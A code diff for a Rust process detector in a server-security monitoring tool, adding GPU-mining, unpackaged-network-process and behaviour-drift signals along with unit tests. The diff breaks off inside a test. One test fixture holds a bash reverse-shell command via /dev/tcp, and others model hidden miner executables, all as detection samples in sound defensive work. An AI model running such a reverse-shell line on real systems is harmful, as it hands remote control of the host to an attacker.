@@ -3,7 +3,8 @@ use crate::detectors::command_profile::{
 };
 use crate::detectors::risk::RiskAssessment;
 use crate::detectors::{
-    evidence, package_activity_context, path_is_allowlisted, string_field, DetectContext, Detector,
+    behavior_profile, evidence, package_activity_context, package_activity_context_from_events,
+    path_is_allowlisted, string_field, DetectContext, Detector, EventIndex,
 };
 use crate::rules::model::RuleMetadata;
 use crate::utils::package::PackageOwnerCache;
@@ -68,107 +69,212 @@ impl Detector for ProcessDetector {
     }
 
     fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
-        let mut findings = Vec::new();
-        let outbound_by_pid = outbound_context_by_pid(events);
-        let gpu_by_pid = gpu_context_by_pid(events);
-        let package_activity = package_activity_context(events);
-        let mut package_owner_cache = PackageOwnerCache::default();
-        for event in events
-            .iter()
-            .filter(|event| event.kind == "process_snapshot")
+        let index = EventIndex::new(events);
+        detect_process_events(&index, ctx, package_activity_context(events))
+    }
+
+    fn detect_indexed(
+        &self,
+        _events: &[RawEvent],
+        index: &EventIndex<'_>,
+        ctx: &DetectContext,
+    ) -> Vec<Finding> {
+        detect_process_events(
+            index,
+            ctx,
+            package_activity_context_from_events(index.kind("package_manager_activity")),
+        )
+    }
+}
+
+fn detect_process_events(
+    index: &EventIndex<'_>,
+    ctx: &DetectContext,
+    package_activity: crate::detectors::PackageActivityContext,
+) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let outbound_by_pid = behavior_profile::outbound_profiles_by_pid(
+        index.kind("outbound_connection"),
+        ctx.config.process.outbound_remote_addr_sample_size,
+    );
+    let gpu_by_pid = gpu_context_by_pid(index.kind("gpu_compute_process"));
+    let mut package_owner_cache = PackageOwnerCache::default();
+    for event in index
+        .kind("process_snapshot")
+        .chain(index.kind("process_exec"))
+    {
+        let mut enriched = event.clone();
+        if let Some(pid) = event.field("pid") {
+            if let Some(outbound) = outbound_by_pid.get(pid) {
+                enriched = behavior_profile::attach_outbound_profile(enriched, outbound);
+            }
+            if let Some(gpu) = gpu_by_pid.get(pid) {
+                enriched = enriched
+                    .with_field("gpu_memory_mb", gpu.memory_mb.to_string())
+                    .with_field("gpu_process_names", gpu.process_names.join(", "));
+                if !gpu.vendors.is_empty() {
+                    enriched = enriched.with_field("gpu_vendors", gpu.vendors.join(", "));
+                }
+                if !gpu.gpu_uuids.is_empty() {
+                    enriched = enriched.with_field("gpu_uuids", gpu.gpu_uuids.join(", "));
+                }
+                if let Some(utilization) = gpu.max_utilization_percent {
+                    enriched =
+                        enriched.with_field("gpu_utilization_percent", utilization.to_string());
+                }
+                if let Some(power) = gpu.max_power_watts {
+                    enriched = enriched.with_field("gpu_power_watts", format!("{power:.1}"));
+                }
+            }
+        }
+        if package_activity.is_active() {
+            enriched = enriched.with_field("package_activity_recent", "true");
+        }
+        enriched = enrich_process_package_identity(enriched, ctx, &mut package_owner_cache);
+        let event = &enriched;
+        let exe_path = string_field(event, "exe_path");
+        let cmdline = string_field(event, "cmdline");
+        if path_is_allowlisted(&exe_path, &ctx.config.allowlist.process_paths)
+            || command_matches_allowlist(&cmdline, &ctx.config.allowlist.process_command_contains)
         {
-            let mut enriched = event.clone();
-            if let Some(pid) = event.field("pid") {
-                if let Some(outbound) = outbound_by_pid.get(pid) {
-                    enriched = enriched
-                        .with_field("outbound_connection_count", outbound.total.to_string())
-                        .with_field("public_outbound_count", outbound.public.to_string())
-                        .with_field("outbound_remote_ports", outbound.remote_ports.join(", "));
-                }
-                if let Some(gpu) = gpu_by_pid.get(pid) {
-                    enriched = enriched
-                        .with_field("gpu_memory_mb", gpu.memory_mb.to_string())
-                        .with_field("gpu_process_names", gpu.process_names.join(", "));
-                    if !gpu.vendors.is_empty() {
-                        enriched = enriched.with_field("gpu_vendors", gpu.vendors.join(", "));
-                    }
-                    if !gpu.gpu_uuids.is_empty() {
-                        enriched = enriched.with_field("gpu_uuids", gpu.gpu_uuids.join(", "));
-                    }
-                }
-            }
-            if package_activity.is_active() {
-                enriched = enriched.with_field("package_activity_recent", "true");
-            }
-            let event = &enriched;
-            let exe_path = string_field(event, "exe_path");
-            let cmdline = string_field(event, "cmdline");
-            if path_is_allowlisted(&exe_path, &ctx.config.allowlist.process_paths)
-                || command_matches_allowlist(
-                    &cmdline,
-                    &ctx.config.allowlist.process_command_contains,
-                )
-            {
-                continue;
-            }
-            if let Some(assessment) = deleted_executable_assessment(event, ctx) {
-                if assessment.is_suspicious(ctx.config.process.deleted_executable_min_score) {
-                    findings.push(deleted_executable(
-                        event,
-                        ctx,
-                        assessment,
-                        &mut package_owner_cache,
-                    ));
-                }
-            }
-            if let Some(assessment) = executable_path_assessment(event, ctx) {
-                if assessment.is_suspicious(ctx.config.process.behavior_min_score) {
-                    findings.push(temp_process(
-                        event,
-                        ctx,
-                        assessment,
-                        &mut package_owner_cache,
-                    ));
-                }
-            }
-            if network_execution_assessment_from_event(event).is_suspicious() {
-                findings.push(network_execution_bridge(
-                    event,
-                    ctx,
-                    &mut package_owner_cache,
-                ));
-            }
-            if let Some(tool_match) =
-                known_tool_match(event, &ctx.config.process.known_bad_tool_names)
-            {
-                findings.push(miner_or_scanner(
-                    event,
-                    ctx,
-                    tool_match,
-                    &mut package_owner_cache,
-                ));
-            }
-            if let Some(assessment) = gpu_mining_assessment(event, ctx) {
-                findings.push(gpu_compute_process(
+            continue;
+        }
+        let source_build_context = source_build_context(event);
+        if let Some(assessment) = deleted_executable_assessment(event, ctx) {
+            if assessment.is_suspicious(ctx.config.process.deleted_executable_min_score) {
+                findings.push(deleted_executable(
                     event,
                     ctx,
                     assessment,
                     &mut package_owner_cache,
                 ));
             }
-            if let Some(assessment) = behavior_cluster_assessment(event, ctx) {
-                if assessment.is_suspicious(ctx.config.process.behavior_min_score) {
-                    findings.push(process_behavior_cluster(
-                        event,
-                        ctx,
-                        assessment,
-                        &mut package_owner_cache,
-                    ));
-                }
+        }
+        if let Some(assessment) = executable_path_assessment(event, ctx) {
+            if !source_build_context
+                && assessment.is_suspicious(ctx.config.process.behavior_min_score)
+            {
+                findings.push(temp_process(
+                    event,
+                    ctx,
+                    assessment,
+                    &mut package_owner_cache,
+                ));
             }
         }
-        findings
+        if network_execution_assessment_from_event(event).is_suspicious() {
+            findings.push(network_execution_bridge(
+                event,
+                ctx,
+                &mut package_owner_cache,
+            ));
+        }
+        if let Some(tool_match) = known_tool_match(event, &ctx.config.process.known_bad_tool_names)
+        {
+            findings.push(miner_or_scanner(
+                event,
+                ctx,
+                tool_match,
+                &mut package_owner_cache,
+            ));
+        }
+        if let Some(assessment) = gpu_mining_assessment(event, ctx) {
+            findings.push(gpu_compute_process(
+                event,
+                ctx,
+                assessment,
+                &mut package_owner_cache,
+            ));
+        }
+        if let Some(assessment) = behavior_cluster_assessment(event, ctx) {
+            if !source_build_context
+                && assessment.is_suspicious(ctx.config.process.behavior_min_score)
+            {
+                findings.push(process_behavior_cluster(
+                    event,
+                    ctx,
+                    assessment,
+                    &mut package_owner_cache,
+                ));
+            }
+        }
     }
+    findings
+}
+
+fn enrich_process_package_identity(
+    event: RawEvent,
+    ctx: &DetectContext,
+    package_cache: &mut PackageOwnerCache,
+) -> RawEvent {
+    let exe_path = string_field(&event, "exe_path");
+    if !should_query_package_identity(&event, ctx) {
+        return event;
+    }
+    if let Some(owner) = package_cache.owner_for_path(&exe_path) {
+        event.with_field("package_owner", owner)
+    } else {
+        event.with_field("package_owner_state", "unowned")
+    }
+}
+
+fn should_query_package_identity(event: &RawEvent, ctx: &DetectContext) -> bool {
+    let exe_path = string_field(event, "exe_path");
+    if exe_path.trim().is_empty() || !exe_path.trim().starts_with('/') {
+        return false;
+    }
+    path_in_suspicious_dirs(&exe_path, &ctx.config.process.suspicious_dirs)
+        || behavior_profile::hidden_basename(&exe_path)
+        || looks_like_kernel_thread_name(&string_field(event, "name"))
+        || behavior_profile::execstart_mismatch(event)
+        || string_field(event, "public_outbound_count")
+            .parse::<usize>()
+            .is_ok_and(|count| count > 0)
+        || string_field(event, "socket_fd_count")
+            .parse::<usize>()
+            .is_ok_and(|count| count >= ctx.config.process.suspicious_socket_fd_threshold)
+        || high_cpu_signal(event, ctx).is_some()
+}
+
+fn source_build_context(event: &RawEvent) -> bool {
+    let exe_path = normalize_path(&string_field(event, "exe_path"));
+    let cmdline = normalize_path(&string_field(event, "cmdline"));
+    let cwd = normalize_path(&string_field(event, "cwd"));
+    let name = string_field(event, "name").to_ascii_lowercase();
+    let parent_name = string_field(event, "parent_name").to_ascii_lowercase();
+
+    let rust_tool = matches!(name.as_str(), "cargo" | "rustc")
+        || exe_path.ends_with("/bin/cargo")
+        || exe_path.ends_with("/bin/rustc")
+        || exe_path.contains("/.cargo/bin/cargo")
+        || exe_path.contains("/.rustup/toolchains/");
+    let cargo_parent = matches!(parent_name.as_str(), "cargo" | "rustc")
+        || cmdline_contains_rust_build_command(&cmdline);
+    let rust_build_artifact = exe_path.contains("/target/")
+        && (exe_path.contains("/build/")
+            || exe_path.contains("/deps/")
+            || exe_path.ends_with("/build-script-build"));
+    let build_workdir = cwd.contains("/target/")
+        || cmdline.contains("/target/")
+        || cmdline.contains("build-script-build");
+
+    (rust_tool || rust_build_artifact) && (cargo_parent || build_workdir)
+}
+
+fn cmdline_contains_rust_build_command(cmdline: &str) -> bool {
+    let command = cmdline.trim();
+    command.contains(" cargo build")
+        || command.contains(" cargo test")
+        || command.contains(" cargo install")
+        || command.starts_with("cargo build")
+        || command.starts_with("cargo test")
+        || command.starts_with("cargo install")
+        || command.contains(" rustc ")
+        || command.starts_with("rustc ")
+}
+
+fn normalize_path(value: &str) -> String {
+    value.replace('\\', "/").to_ascii_lowercase()
 }
 
 fn temp_process(
@@ -220,7 +326,7 @@ fn executable_path_assessment(event: &RawEvent, ctx: &DetectContext) -> Option<B
     };
     assessment.add_signal(path_score, path_feature, path_reason);
 
-    if hidden_basename(&exe_path) {
+    if behavior_profile::hidden_basename(&exe_path) {
         assessment.add_signal(
             25,
             "hidden_executable_name",
@@ -350,7 +456,9 @@ fn deleted_executable_assessment(event: &RawEvent, ctx: &DetectContext) -> Optio
         );
     }
 
-    if hidden_basename(&normalized_path) && !is_standard_runtime_path(&normalized_path) {
+    if behavior_profile::hidden_basename(&normalized_path)
+        && !is_standard_runtime_path(&normalized_path)
+    {
         assessment.add_signal(
             70,
             "hidden_nonstandard_executable",
@@ -580,6 +688,7 @@ fn process_evidence(
         evidence("cmdline", string_field(event, "cmdline")),
     ];
     push_evidence_if_present(&mut items, event, "parent_name");
+    push_evidence_if_present(&mut items, event, "process_ancestry");
     push_evidence_if_present(&mut items, event, "systemd_unit");
     push_evidence_if_present(&mut items, event, "systemd_execstart");
     push_evidence_if_present(&mut items, event, "container_context");
@@ -589,18 +698,40 @@ fn process_evidence(
     push_evidence_if_present(&mut items, event, "exe_gid");
     push_evidence_if_present(&mut items, event, "exe_size");
     push_evidence_if_present(&mut items, event, "exe_hash_blake3");
+    push_evidence_if_present(&mut items, event, "package_owner_state");
     push_evidence_if_present(&mut items, event, "cpu_percent");
     push_evidence_if_present(&mut items, event, "cpu_total_seconds");
     push_evidence_if_present(&mut items, event, "process_age_seconds");
     push_evidence_if_present(&mut items, event, "process_start_drift");
+    push_evidence_if_present(&mut items, event, "behavior_profile_first_seen");
+    push_evidence_if_present(&mut items, event, "behavior_profile_observations");
+    push_evidence_if_present(&mut items, event, "behavior_profile_drift");
+    push_evidence_if_present(&mut items, event, "behavior_profile_new_remote_ports");
+    push_evidence_if_present(&mut items, event, "behavior_profile_public_fanout_drift");
+    push_evidence_if_present(
+        &mut items,
+        event,
+        "behavior_profile_previous_public_outbound_max",
+    );
+    push_evidence_if_present(
+        &mut items,
+        event,
+        "behavior_profile_current_public_outbound",
+    );
     push_evidence_if_present(&mut items, event, "outbound_connection_count");
     push_evidence_if_present(&mut items, event, "public_outbound_count");
     push_evidence_if_present(&mut items, event, "outbound_remote_ports");
+    push_evidence_if_present(&mut items, event, "public_outbound_remote_addrs");
+    push_evidence_if_present(&mut items, event, "outbound_remote_addr_sample_truncated");
     push_evidence_if_present(&mut items, event, "gpu_memory_mb");
     push_evidence_if_present(&mut items, event, "gpu_vendors");
     push_evidence_if_present(&mut items, event, "gpu_process_names");
     push_evidence_if_present(&mut items, event, "gpu_uuids");
+    push_evidence_if_present(&mut items, event, "gpu_utilization_percent");
+    push_evidence_if_present(&mut items, event, "gpu_power_watts");
     push_evidence_if_present(&mut items, event, "package_activity_recent");
+    push_evidence_if_present(&mut items, event, "ephemeral_event");
+    push_evidence_if_present(&mut items, event, "event_source_detail");
     push_package_owner_if_available(&mut items, event, package_cache);
     items
 }
@@ -657,6 +788,8 @@ impl BehaviorAssessment {
             "web_path_executable",
             "hidden_executable_name",
             "suspicious_cwd",
+            "systemd_execstart_mismatch",
+            "unpackaged_network_process",
         ]
         .iter()
         .any(|feature| self.features.contains(*feature))
@@ -698,7 +831,7 @@ fn behavior_cluster_assessment(
             "process executable is under a configured web root",
         );
     }
-    if hidden_basename(&exe_path) {
+    if behavior_profile::hidden_basename(&exe_path) {
         assessment.add_signal(
             25,
             "hidden_executable_name",
@@ -743,11 +876,83 @@ fn behavior_cluster_assessment(
             "process has established outbound connections to public addresses",
         );
     }
+    if public_outbound_count >= ctx.config.process.public_outbound_fanout_threshold {
+        assessment.add_signal(
+            35,
+            "public_outbound_fanout",
+            format!(
+                "process has {} public outbound connections in one scan window",
+                public_outbound_count
+            ),
+        );
+    }
+    if behavior_profile::execstart_mismatch(event) {
+        assessment.add_signal(
+            35,
+            "systemd_execstart_mismatch",
+            "systemd ExecStart does not appear to match the running process identity",
+        );
+    }
+    let shell_or_scheduler_parent =
+        behavior_profile::is_shell_or_scheduler_parent(&string_field(event, "parent_name"));
+    let low_risk_interactive_network_operation = low_risk_interactive_network_operation(event, ctx);
+    if string_field(event, "package_owner_state") == "unowned"
+        && public_outbound_count > 0
+        && ((shell_or_scheduler_parent && !low_risk_interactive_network_operation)
+            || high_cpu_signal(event, ctx).is_some()
+            || behavior_profile::hidden_basename(&exe_path)
+            || behavior_profile::execstart_mismatch(event)
+            || looks_like_kernel_thread_name(&name))
+    {
+        assessment.add_signal(
+            45,
+            "unpackaged_network_process",
+            "network-active process executable has no package owner and additional suspicious context",
+        );
+    }
+    if shell_or_scheduler_parent
+        && !low_risk_interactive_network_operation
+        && (public_outbound_count > 0 || behavior_profile::hidden_basename(&exe_path))
+    {
+        assessment.add_signal(
+            20,
+            "shell_or_scheduler_parent",
+            "process was started by an interactive shell or scheduler-like parent",
+        );
+    }
     if string_field(event, "process_start_changed") == "true" && assessment.score >= 40 {
         assessment.add_signal(
             10,
             "process_start_drift",
             "same process identity has a different procfs start time than the previous scan",
+        );
+    }
+    if !string_field(event, "behavior_profile_new_remote_ports").is_empty()
+        && (public_outbound_count > 0 || socket_fd_count > 0)
+    {
+        assessment.add_signal(
+            15,
+            "local_behavior_new_remote_ports",
+            "local behavior profile observed remote ports not seen in the matured process profile",
+        );
+    }
+    if string_field(event, "behavior_profile_public_fanout_drift") == "true"
+        && public_outbound_count > 0
+    {
+        assessment.add_signal(
+            25,
+            "local_behavior_public_fanout_drift",
+            "local behavior profile observed a public outbound fanout above the matured process profile",
+        );
+    }
+    if string_field(event, "behavior_profile_first_seen") == "true"
+        && assessment.score >= 55
+        && (public_outbound_count > 0 || socket_fd_count > 0)
+    {
+        assessment.add_signal(
+            5,
+            "local_behavior_first_seen",
+            "process identity has not yet appeared in the local behavior profile",
         );
     }
     if euid == ROOT_UID && assessment.score >= 55 {
@@ -763,6 +968,53 @@ fn behavior_cluster_assessment(
     } else {
         Some(assessment)
     }
+}
+
+fn low_risk_interactive_network_operation(event: &RawEvent, ctx: &DetectContext) -> bool {
+    if !behavior_profile::is_shell_or_scheduler_parent(&string_field(event, "parent_name")) {
+        return false;
+    }
+
+    let public_outbound_count = string_field(event, "public_outbound_count")
+        .parse::<usize>()
+        .unwrap_or(0);
+    if public_outbound_count == 0 || public_outbound_count > 2 {
+        return false;
+    }
+
+    let socket_fd_count = string_field(event, "socket_fd_count")
+        .parse::<usize>()
+        .unwrap_or(0);
+    if socket_fd_count >= ctx.config.process.suspicious_socket_fd_threshold {
+        return false;
+    }
+
+    let Some(age_seconds) = string_field(event, "process_age_seconds")
+        .parse::<f64>()
+        .ok()
+    else {
+        return false;
+    };
+    let operation_window_seconds = ctx.config.agent.scan_interval_seconds.max(60) as f64 * 2.0;
+    if age_seconds > operation_window_seconds {
+        return false;
+    }
+
+    let exe_path = string_field(event, "exe_path");
+    if exe_path.trim().is_empty()
+        || behavior_profile::hidden_basename(&exe_path)
+        || behavior_profile::execstart_mismatch(event)
+        || looks_like_kernel_thread_name(&string_field(event, "name"))
+        || is_deleted_executable_path(&exe_path)
+        || is_memfd_or_anonymous_path(&normalize_deleted_executable_path(&exe_path))
+        || path_in_suspicious_dirs(&exe_path, &ctx.config.process.suspicious_dirs)
+        || path_in_web_roots(&exe_path, ctx)
+        || high_cpu_signal(event, ctx).is_some()
+    {
+        return false;
+    }
+
+    true
 }
 
 fn gpu_mining_assessment(event: &RawEvent, ctx: &DetectContext) -> Option<RiskAssessment> {
@@ -831,7 +1083,7 @@ fn gpu_mining_assessment(event: &RawEvent, ctx: &DetectContext) -> Option<RiskAs
         );
     }
 
-    if hidden_basename(&normalized_path) {
+    if behavior_profile::hidden_basename(&normalized_path) {
         assessment.add_signal(
             55,
             "gpu_hidden_executable_name",
@@ -849,14 +1101,20 @@ fn gpu_mining_assessment(event: &RawEvent, ctx: &DetectContext) -> Option<RiskAs
             "GPU compute process has established outbound connections to public addresses",
         );
     }
+    if let Some(utilization) = high_gpu_utilization_signal(event, ctx) {
+        assessment.add_signal(35, "gpu_high_utilization", utilization);
+    }
+    if let Some(power) = high_gpu_power_signal(event, ctx) {
+        assessment.add_signal(25, "gpu_high_power_draw", power);
+    }
     if let Some(cpu) = high_cpu_signal(event, ctx) {
         assessment.add_signal(35, "gpu_sustained_high_cpu", cpu.reason());
     }
 
-    if !string_field(event, "container_runtime").is_empty() {
+    if !string_field(event, "container_context").is_empty() {
         assessment.add_feature("gpu_container_context");
     }
-    if process_started_by_shell_or_scheduler(event) {
+    if behavior_profile::is_shell_or_scheduler_parent(&string_field(event, "parent_name")) {
         assessment.add_signal(
             45,
             "gpu_shell_or_scheduler_parent",
@@ -887,18 +1145,63 @@ fn gpu_mining_assessment(event: &RawEvent, ctx: &DetectContext) -> Option<RiskAs
             "hidden GPU compute executable also has public outbound network activity",
         );
     }
+    if high_utilization_with_mining_port(&assessment) {
+        assessment.add_signal(
+            70,
+            "gpu_high_utilization_mining_port_cluster",
+            "GPU compute process combines high GPU utilization with configured mining-pool ports",
+        );
+    }
+    if high_utilization_hidden_or_deleted(&assessment) {
+        assessment.add_signal(
+            65,
+            "gpu_high_utilization_suspicious_identity_cluster",
+            "GPU compute process combines high GPU utilization with hidden, deleted, anonymous, or suspicious-path identity",
+        );
+    }
 
     assessment
         .is_suspicious(ctx.config.gpu.mining_min_score)
         .then_some(assessment)
 }
 
-fn process_started_by_shell_or_scheduler(event: &RawEvent) -> bool {
-    let parent = string_field(event, "parent_name").to_ascii_lowercase();
-    matches!(
-        parent.as_str(),
-        "sh" | "bash" | "dash" | "zsh" | "fish" | "cron" | "crond" | "atd"
-    )
+fn high_gpu_utilization_signal(event: &RawEvent, ctx: &DetectContext) -> Option<String> {
+    let utilization = event.field("gpu_utilization_percent")?.parse::<u8>().ok()?;
+    (utilization >= ctx.config.gpu.high_utilization_percent).then(|| {
+        format!(
+            "GPU utilization {utilization}% exceeds configured threshold {}%",
+            ctx.config.gpu.high_utilization_percent
+        )
+    })
+}
+
+fn high_gpu_power_signal(event: &RawEvent, ctx: &DetectContext) -> Option<String> {
+    let power = event.field("gpu_power_watts")?.parse::<f32>().ok()?;
+    (power >= ctx.config.gpu.high_power_watts).then(|| {
+        format!(
+            "GPU power draw {:.1}W exceeds configured threshold {:.1}W",
+            power, ctx.config.gpu.high_power_watts
+        )
+    })
+}
+
+fn high_utilization_with_mining_port(assessment: &RiskAssessment) -> bool {
+    assessment.has_feature("gpu_high_utilization")
+        && assessment.has_feature("mining_pool_remote_port")
+}
+
+fn high_utilization_hidden_or_deleted(assessment: &RiskAssessment) -> bool {
+    assessment.has_feature("gpu_high_utilization")
+        && [
+            "gpu_hidden_executable_name",
+            "gpu_deleted_executable",
+            "gpu_anonymous_executable",
+            "gpu_temporary_executable_path",
+            "gpu_configured_suspicious_executable_path",
+            "gpu_runtime_executable_path",
+        ]
+        .iter()
+        .any(|feature| assessment.has_feature(feature))
 }
 
 fn privileged_gpu_process_with_network_and_cpu(
@@ -914,7 +1217,7 @@ fn shell_started_gpu_process_with_public_network(
     event: &RawEvent,
     assessment: &RiskAssessment,
 ) -> bool {
-    process_started_by_shell_or_scheduler(event)
+    behavior_profile::is_shell_or_scheduler_parent(&string_field(event, "parent_name"))
         && assessment.has_feature("gpu_public_outbound_connections")
         && !looks_like_interactive_ml_workspace(event)
 }
@@ -1166,52 +1469,20 @@ fn high_cpu_signal(event: &RawEvent, ctx: &DetectContext) -> Option<HighCpuSigna
 }
 
 #[derive(Debug, Clone, Default)]
-struct OutboundContext {
-    total: usize,
-    public: usize,
-    remote_ports: Vec<String>,
-}
-
-fn outbound_context_by_pid(events: &[RawEvent]) -> BTreeMap<String, OutboundContext> {
-    let mut by_pid = BTreeMap::<String, OutboundContext>::new();
-    for event in events
-        .iter()
-        .filter(|event| event.kind == "outbound_connection")
-    {
-        let Some(pid) = event.field("pid").filter(|pid| !pid.trim().is_empty()) else {
-            continue;
-        };
-        let context = by_pid.entry(pid.to_string()).or_default();
-        context.total += 1;
-        if event.field("remote_public") == Some("true") {
-            context.public += 1;
-        }
-        if let Some(port) = event
-            .field("remote_port")
-            .filter(|port| !port.trim().is_empty())
-        {
-            context.remote_ports.push(port.to_string());
-            context.remote_ports.sort();
-            context.remote_ports.dedup();
-        }
-    }
-    by_pid
-}
-
-#[derive(Debug, Clone, Default)]
 struct GpuContext {
     memory_mb: u64,
     vendors: Vec<String>,
     process_names: Vec<String>,
     gpu_uuids: Vec<String>,
+    max_utilization_percent: Option<u8>,
+    max_power_watts: Option<f32>,
 }
 
-fn gpu_context_by_pid(events: &[RawEvent]) -> BTreeMap<String, GpuContext> {
+fn gpu_context_by_pid<'a>(
+    events: impl IntoIterator<Item = &'a RawEvent>,
+) -> BTreeMap<String, GpuContext> {
     let mut by_pid = BTreeMap::<String, GpuContext>::new();
-    for event in events
-        .iter()
-        .filter(|event| event.kind == "gpu_compute_process")
-    {
+    for event in events {
         let Some(pid) = event.field("pid").filter(|pid| !pid.trim().is_empty()) else {
             continue;
         };
@@ -1225,8 +1496,36 @@ fn gpu_context_by_pid(events: &[RawEvent]) -> BTreeMap<String, GpuContext> {
         push_unique_field(&mut context.vendors, event, "gpu_vendor");
         push_unique_field(&mut context.process_names, event, "gpu_process_name");
         push_unique_field(&mut context.gpu_uuids, event, "gpu_uuid");
+        update_max_u8(
+            &mut context.max_utilization_percent,
+            event,
+            "gpu_utilization_percent",
+        );
+        update_max_f32(&mut context.max_power_watts, event, "gpu_power_watts");
     }
     by_pid
+}
+
+fn update_max_u8(current: &mut Option<u8>, event: &RawEvent, key: &str) {
+    let Some(value) = event.field(key).and_then(|value| value.parse::<u8>().ok()) else {
+        return;
+    };
+    if current.map_or(true, |existing| value > existing) {
+        *current = Some(value);
+    }
+}
+
+fn update_max_f32(current: &mut Option<f32>, event: &RawEvent, key: &str) {
+    let Some(value) = event
+        .field(key)
+        .and_then(|value| value.parse::<f32>().ok())
+        .filter(|value| value.is_finite())
+    else {
+        return;
+    };
+    if current.map_or(true, |existing| value > existing) {
+        *current = Some(value);
+    }
 }
 
 fn push_unique_field(values: &mut Vec<String>, event: &RawEvent, key: &str) {
@@ -1270,6 +1569,13 @@ fn push_package_owner_if_available(
     event: &RawEvent,
     package_cache: &mut PackageOwnerCache,
 ) {
+    if let Some(owner) = event
+        .field("package_owner")
+        .filter(|owner| !owner.trim().is_empty())
+    {
+        items.push(evidence("package_owner", owner));
+        return;
+    }
     let path = string_field(event, "exe_path");
     if let Some(owner) = package_cache.owner_for_path(&path) {
         items.push(evidence("package_owner", owner));
@@ -1290,13 +1596,6 @@ fn normalize_deleted_executable_path(path: &str) -> String {
 fn is_memfd_or_anonymous_path(path: &str) -> bool {
     let lowered = path.to_ascii_lowercase();
     lowered.contains("memfd:") || lowered.contains("/deleted") || lowered == "deleted"
-}
-
-fn hidden_basename(path: &str) -> bool {
-    path.rsplit('/')
-        .next()
-        .map(|name| name.starts_with('.') && name.len() > 1)
-        .unwrap_or(false)
 }
 
 fn is_standard_runtime_path(path: &str) -> bool {
@@ -1411,6 +1710,30 @@ mod tests {
     }
 
     #[test]
+    fn short_lived_process_exec_reuses_process_rules() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let event = RawEvent::new("ebpf", "process_exec")
+            .with_field("pid", "42")
+            .with_field("ppid", "1")
+            .with_field("name", "bash")
+            .with_field("exe_path", "/usr/bin/bash")
+            .with_field("cmdline", "bash -c bash -i >& /dev/tcp/8.8.8.8/4444 0>&1")
+            .with_field("ephemeral_event", "true")
+            .with_field("event_source_detail", "execve");
+
+        let findings = ProcessDetector.detect(&[event], &ctx);
+
+        let finding = findings
+            .iter()
+            .find(|finding| finding.rule_id == "PROC-003")
+            .expect("short-lived network execution finding");
+        assert!(finding
+            .evidence
+            .iter()
+            .any(|item| item.key == "ephemeral_event" && item.value == "true"));
+    }
+
+    #[test]
     fn known_tool_finding_includes_match_source_and_cpu_context() {
         let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
         let event = process_event(
@@ -1500,7 +1823,9 @@ mod tests {
         let process = process_event("/root/.cache/.sysd", ".sysd", "/root/.cache/.sysd")
             .with_field("cwd", "/root/.cache")
             .with_field("euid", "0");
-        let gpu = gpu_event("42", "/root/.cache/.sysd", 6144);
+        let gpu = gpu_event("42", "/root/.cache/.sysd", 6144)
+            .with_field("gpu_utilization_percent", "96")
+            .with_field("gpu_power_watts", "210.5");
         let outbound = RawEvent::new("network", "outbound_connection")
             .with_field("pid", "42")
             .with_field("remote_addr", "198.51.100.10")
@@ -1520,6 +1845,16 @@ mod tests {
             .evidence
             .iter()
             .any(|item| item.key == "mining_pool_remote_ports" && item.value == "3333"));
+        assert!(finding.evidence.iter().any(|item| {
+            item.key == "risk_features"
+                && item
+                    .value
+                    .contains("gpu_high_utilization_mining_port_cluster")
+        }));
+        assert!(finding
+            .evidence
+            .iter()
+            .any(|item| { item.key == "gpu_utilization_percent" && item.value == "96" }));
     }
 
     #[test]
@@ -1541,6 +1876,25 @@ mod tests {
             .with_field("remote_public", "true");
 
         let findings = ProcessDetector.detect(&[process, gpu, outbound], &ctx);
+
+        assert!(findings.iter().all(|finding| finding.rule_id != "PROC-006"));
+    }
+
+    #[test]
+    fn high_gpu_utilization_alone_does_not_alert_for_training_workload() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let process = process_event(
+            "/home/ml/.venv/bin/python",
+            "python",
+            "python train.py --epochs 100",
+        )
+        .with_field("cwd", "/home/ml/project")
+        .with_field("euid", "1000");
+        let gpu = gpu_event("42", "/home/ml/.venv/bin/python", 24576)
+            .with_field("gpu_utilization_percent", "99")
+            .with_field("gpu_power_watts", "240.0");
+
+        let findings = ProcessDetector.detect(&[process, gpu], &ctx);
 
         assert!(findings.iter().all(|finding| finding.rule_id != "PROC-006"));
     }
@@ -1624,6 +1978,32 @@ mod tests {
         assert!(assessment.is_some_and(|assessment| {
             assessment.has_feature("process_start_drift")
                 && assessment.has_feature("kernel_thread_masquerade")
+        }));
+    }
+
+    #[test]
+    fn local_behavior_profile_drift_is_only_a_supporting_signal() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let normal_drift = process_event("/usr/local/bin/app", "app", "app --serve")
+            .with_field("socket_fd_count", "1")
+            .with_field("public_outbound_count", "1")
+            .with_field("behavior_profile_new_remote_ports", "8443")
+            .with_field("behavior_profile_public_fanout_drift", "true");
+
+        assert!(behavior_cluster_assessment(&normal_drift, &ctx).is_none());
+
+        let suspicious_drift = process_event("/usr/local/bin/.sysd", ".sysd", ".sysd --worker")
+            .with_field("socket_fd_count", "1")
+            .with_field("public_outbound_count", "16")
+            .with_field("behavior_profile_new_remote_ports", "3333")
+            .with_field("behavior_profile_public_fanout_drift", "true");
+
+        let assessment = behavior_cluster_assessment(&suspicious_drift, &ctx);
+
+        assert!(assessment.is_some_and(|assessment| {
+            assessment.has_feature("hidden_executable_name")
+                && assessment.has_feature("local_behavior_new_remote_ports")
+                && assessment.has_feature("local_behavior_public_fanout_drift")
         }));
     }
 
@@ -1859,6 +2239,130 @@ mod tests {
         let findings = ProcessDetector.detect(&[event], &ctx);
 
         assert!(findings.iter().all(|finding| finding.rule_id != "PROC-005"));
+    }
+
+    #[test]
+    fn behavior_cluster_ignores_short_lived_operator_network_push() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let event = process_event(
+            "/usr/local/bin/vps-sentinel",
+            "vps-sentinel",
+            "vps-sentinel --config /etc/vps-sentinel/config.toml panel push",
+        )
+        .with_field("cwd", "/root")
+        .with_field("euid", "0")
+        .with_field("parent_name", "bash")
+        .with_field("socket_fd_count", "4")
+        .with_field("public_outbound_count", "1")
+        .with_field("process_age_seconds", "0.4")
+        .with_field("package_owner_state", "unowned");
+
+        let assessment = behavior_cluster_assessment(&event, &ctx);
+
+        assert!(assessment.is_none());
+    }
+
+    #[test]
+    fn behavior_cluster_detects_long_lived_unowned_shell_network_process() {
